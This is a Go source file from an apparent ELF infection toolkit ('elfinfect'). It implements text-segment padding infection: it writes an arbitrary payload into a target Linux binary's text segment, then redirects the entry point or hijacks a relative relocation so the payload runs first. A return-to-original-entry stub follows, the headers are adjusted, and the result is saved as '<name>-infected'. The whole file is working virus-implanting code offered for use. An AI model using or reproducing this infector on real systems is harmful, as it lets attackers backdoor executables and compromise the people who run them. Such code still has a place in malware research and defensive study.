package elfinfect

import (
	"bytes"
	"debug/elf"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"errors"
	"reflect"
)

const (
	PAGE_SIZE                       int    = 0x1000
	MOD_ENTRY_POINT                 string = "[+] Modified entry point from 0x%x -> 0x%x\n"
	TEXT_SEG_START                  string = "[+] Text segment starts @ 0x%x\n"
	TEXT_SEG_END                    string = "[+] Text segment ends @ 0x%x\n"
	PAYLOAD_LEN_PRE_EPILOGUE        string = "[+] Payload size pre-epilogue 0x%x\n"
	PAYLOAD_LEN_POST_EPILOGUE       string = "[+] Payload size post-epilogue 0x%x\n"
	GENERATE_AND_APPEND_PIC_STUB    string = "[+] Generated and appended position independent return 2 OEP stub to payload"
	INCREASED_TEXT_SEG_P_FILESZ     string = "[+] Increased text segment p_filesz and p_memsz by %d (length of payload)\n"
	ADJUST_SEGMENTS_AFTER_TEXT      string = "[+] Adjusting segments after text segment file offsets by 0x%x\n"
	INCREASE_PHEADER_AT_INDEX_BY    string = "Inceasing pHeader @ index %d by 0x%x\n"
	INCREASE_SECTION_HEADER_ADDRESS string = "[+] Increasing section header addresses if they come after text segment"
	UPDATE_SECTIONS_PAST_TEXT_SEG   string = "[+] (%d) Updating sections past text section @ addr 0x%x\n"
	EXTEND_SECTION_HEADER_ENTRY     string = "[+] Extending section header entry for text section by payload len."
	ERROR_NO_TEXT_SEG               string = "[-] No text segment found in target binary possibly corrupted\n"

)


func (t *TargetBin) TextSegmentPaddingInfection(opts InfectOpts, debug bool ) error {
	var textSegEnd interface{}
	var oShoff interface{}
	
	textNdx := t.impNdx.textNdx

	if textNdx == 0 {
		return errors.New(ERROR_NO_TEXT_SEG)	
	}

	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		oEntry := t.Hdr.(*elf.Header64).Entry
		oShoff = t.Hdr.(*elf.Header64).Shoff

		t.Hdr.(*elf.Header64).Shoff += uint64(PAGE_SIZE)
		pHeaders := t.Phdrs.([]elf.Prog64)
		
		var origAddend int64
		var relocEntry elf.Rela64

		if (opts & CtorsHijack) == CtorsHijack {
			
			if debug {
				fmt.Println("[+] CtorsHijack requested. Locating and reading Dynamic Segment")
		
			}
			
			if err := t.GetDyn(); err != nil {
				return err;
			}
			
			if debug {
				fmt.Printf("[+] %d entries in Dynamic Segment\n", len(t.Dyn.([]elf.Dyn64)))
			}
			
			var dtRelaOffset uint64
			var dtRelaEntryCount uint64

			for _, dynEntry := range t.Dyn.([]elf.Dyn64) {
				if elf.DynTag(dynEntry.Tag) == elf.DT_RELA {
					if debug {
						fmt.Printf("[+] Located DT_RELA @ 0x%016x\n", dynEntry.Val)
					}
					dtRelaOffset = dynEntry.Val
				}

				if elf.DynTag(dynEntry.Tag) == elf.DT_RELAENT {
					if debug {
						fmt.Printf("[+] DT_RELA has %d entries\n", dynEntry.Val)
					}
					dtRelaEntryCount = dynEntry.Val
				}
			}

			if dtRelaEntryCount == 0 || dtRelaOffset == 0 {
				return errors.New("Error while acquiring DT_RELA or DT_RELAENT")
			}
			
			var o uint64
			if elf.Type(t.Hdr.(*elf.Header64).Type) == elf.ET_EXEC {
				if err := getBaseAddrOfVaddr(dtRelaOffset, t.Phdrs.([]elf.Prog64), &o); err != nil {
					return err
				}
			}else {
				o = dtRelaOffset
			}
			
			if debug{
				fmt.Printf("[+] File offset of relocations @ 0x%016x\n", o)
			}
			
			origRelocStart := o
			
			s := uint64(reflect.TypeOf(relocEntry).Size())		
			endReloc := o + dtRelaEntryCount * uint64(s)
			for o < endReloc {
				relReader := bytes.NewBuffer(t.Contents[o : o + s])
				if err := binary.Read(relReader, t.EIdent.Endianness, &relocEntry); err != nil {
					return err
				}
				
				if elf.R_X86_64(relocEntry.Info) == elf.R_X86_64_RELATIVE {
					if debug {
						fmt.Println("[+] Found first relative reloc")
						fmt.Printf("\toffset: 0x%016x\n", relocEntry.Off) 
						fmt.Printf("\ttype: %s\n", elf.R_X86_64_RELATIVE.String())
						fmt.Printf("\tAddend: 0x%016x\n", relocEntry.Addend)
					}
					break
				}
				o += s
			}

			if elf.R_X86_64(relocEntry.Info) != elf.R_X86_64_RELATIVE {
				return errors.New("No R_X86_64_RELATIVE relocation type present for this technique.")
			}
			
			origAddend = relocEntry.Addend
			relocEntry.Addend = int64(pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz) 
			relWriter := new(bytes.Buffer)
			if err := binary.Write(relWriter, t.EIdent.Endianness, &relocEntry); err != nil {
				return err
			}
			copy(t.Contents[origRelocStart:], relWriter.Bytes())
			

		}else {
			t.Hdr.(*elf.Header64).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
		}

		if debug {
			fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header64).Entry)
		}

		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz
		if debug {
			fmt.Printf(TEXT_SEG_START, pHeaders[textNdx].Off)
			fmt.Printf(TEXT_SEG_END, textSegEnd.(uint64))
			fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
		}

		if !((opts & NoRest) == NoRest)  {
			t.Payload.Write(restoration64)
		}

		if !((opts & NoRetOEP) == NoRetOEP) {
			var retStub []byte
			if (opts & CtorsHijack) == CtorsHijack {
				retStub = modEpilogue(int32(t.Payload.Len() + 5), uint64(relocEntry.Addend), uint64(origAddend))
			}else {
				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry)
			}
			t.Payload.Write(retStub)
		}

		if debug {
			fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
			printPayload(t.Payload.Bytes())
		}

		t.Phdrs.([]elf.Prog64)[textNdx].Memsz += uint64(t.Payload.Len())
		t.Phdrs.([]elf.Prog64)[textNdx].Filesz += uint64(t.Payload.Len())

		if debug {
			fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
			fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
		}

		if debug {
			fmt.Printf(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
		}

		for j := textNdx; j < len(pHeaders); j++ {
			if pHeaders[textNdx].Off < pHeaders[j].Off {
				if debug {
					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
				}
				t.Phdrs.([]elf.Prog64)[j].Off += uint64(PAGE_SIZE)
			}
		}

		if debug {
			fmt.Println(INCREASE_SECTION_HEADER_ADDRESS)
		}
		sectionHdrTable := t.Shdrs.([]elf.Section64)
		sNum := int(t.Hdr.(*elf.Header64).Shnum)

		for k := 0; k < sNum; k++ {
			if sectionHdrTable[k].Off >= textSegEnd.(uint64) {
				if debug {
					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
				}
				t.Shdrs.([]elf.Section64)[k].Off += uint64(PAGE_SIZE)
			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header64).Entry {
				if debug {
					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
				}
				t.Shdrs.([]elf.Section64)[k].Size += uint64(t.Payload.Len())
			}
		}

	case elf.ELFCLASS32:
		oEntry := t.Hdr.(*elf.Header32).Entry
		oShoff = t.Hdr.(*elf.Header32).Shoff

		t.Hdr.(*elf.Header32).Shoff += uint32(PAGE_SIZE)
		pHeaders := t.Phdrs.([]elf.Prog32)
		
		t.Hdr.(*elf.Header32).Entry = pHeaders[textNdx].Vaddr + pHeaders[textNdx].Filesz
		if debug {
			fmt.Printf(MOD_ENTRY_POINT, oEntry, t.Hdr.(*elf.Header32).Entry)
		}

		textSegEnd = pHeaders[textNdx].Off + pHeaders[textNdx].Filesz
		if debug {
			fmt.Printf(TEXT_SEG_START, pHeaders[textNdx].Off)
			fmt.Printf(TEXT_SEG_END, textSegEnd.(uint32))
			fmt.Printf(PAYLOAD_LEN_PRE_EPILOGUE, t.Payload.Len())
		}

		if !((opts & NoRest) == NoRest) {
				t.Payload.Write(restoration32)
		}

		if !((opts & NoRetOEP) == NoRetOEP) {
			retStub := modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header32).Entry, oEntry)
			t.Payload.Write(retStub)
		}

		if debug {
			fmt.Printf(PAYLOAD_LEN_POST_EPILOGUE, t.Payload.Len())
			printPayload(t.Payload.Bytes())
		}

		t.Phdrs.([]elf.Prog32)[textNdx].Memsz += uint32(t.Payload.Len())
		t.Phdrs.([]elf.Prog32)[textNdx].Filesz += uint32(t.Payload.Len())

		if debug {
			fmt.Println(GENERATE_AND_APPEND_PIC_STUB)
			fmt.Printf(INCREASED_TEXT_SEG_P_FILESZ, t.Payload.Len())
		}	

		
		if debug {
			fmt.Printf(ADJUST_SEGMENTS_AFTER_TEXT, PAGE_SIZE)
		}

		for j := textNdx; j < len(pHeaders); j++ {
			if pHeaders[textNdx].Off < pHeaders[j].Off {
				if debug {
					fmt.Printf(INCREASE_PHEADER_AT_INDEX_BY, j, PAGE_SIZE)
				}
				t.Phdrs.([]elf.Prog32)[j].Off += uint32(PAGE_SIZE)
			}
		}

		if debug {
			fmt.Println(INCREASE_SECTION_HEADER_ADDRESS)
		}
		sectionHdrTable := t.Shdrs.([]elf.Section32)
		sNum := int(t.Hdr.(*elf.Header32).Shnum)

		for k := 0; k < sNum; k++ {
			if sectionHdrTable[k].Off >= textSegEnd.(uint32) {
				if debug {
					fmt.Printf(UPDATE_SECTIONS_PAST_TEXT_SEG, k, sectionHdrTable[k].Addr)
				}
				t.Shdrs.([]elf.Section32)[k].Off += uint32(PAGE_SIZE)
			} else if (sectionHdrTable[k].Size + sectionHdrTable[k].Addr) == t.Hdr.(*elf.Header32).Entry {
				if debug {
					fmt.Println(EXTEND_SECTION_HEADER_ENTRY)
				}
				t.Shdrs.([]elf.Section32)[k].Size += uint32(t.Payload.Len())
			}
		}
	}

	infected := new(bytes.Buffer)

	if h, ok := t.Hdr.(*elf.Header64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if h, ok := t.Hdr.(*elf.Header32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, h); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog64); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	if p, ok := t.Phdrs.([]elf.Prog32); ok {
		if err := binary.Write(infected, t.EIdent.Endianness, p); err != nil {
			return err
		}
	}

	var ephdrsz int
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		ephdrsz = int(t.Hdr.(*elf.Header64).Ehsize) + int(t.Hdr.(*elf.Header64).Phentsize * t.Hdr.(*elf.Header64).Phnum)
	case elf.ELFCLASS32:
		ephdrsz = int(t.Hdr.(*elf.Header32).Ehsize) + int(t.Hdr.(*elf.Header32).Phentsize * t.Hdr.(*elf.Header32).Phnum)
	}

	infected.Write(t.Contents[ephdrsz:])

	infectedShdrTable := new(bytes.Buffer)
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section64))
	case elf.ELFCLASS32:
		binary.Write(infectedShdrTable, t.EIdent.Endianness, t.Shdrs.([]elf.Section32))
	}

	finalInfectionTwo := make([]byte, infected.Len() + int(PAGE_SIZE))
	finalInfection := infected.Bytes()

	var endOfInfection int
	switch t.EIdent.Arch {
	case elf.ELFCLASS64:
		copy(finalInfection[int(oShoff.(uint64)):], infectedShdrTable.Bytes())
		endOfInfection = int(textSegEnd.(uint64))
	case elf.ELFCLASS32:
		copy(finalInfection[int(oShoff.(uint32)):], infectedShdrTable.Bytes())
		endOfInfection = int(textSegEnd.(uint32))
	}

	copy(finalInfectionTwo, finalInfection[:endOfInfection])

	if debug {
		fmt.Println("[+] writing payload into the binary")
	}

	copy(finalInfectionTwo[endOfInfection:], t.Payload.Bytes())
	copy(finalInfectionTwo[endOfInfection + PAGE_SIZE:], finalInfection[endOfInfection:])
	infectedFileName := fmt.Sprintf("%s-infected", t.Fh.Name())

	if err := ioutil.WriteFile(infectedFileName, finalInfectionTwo, 0751); err != nil {
		return err
	}

	return nil
}
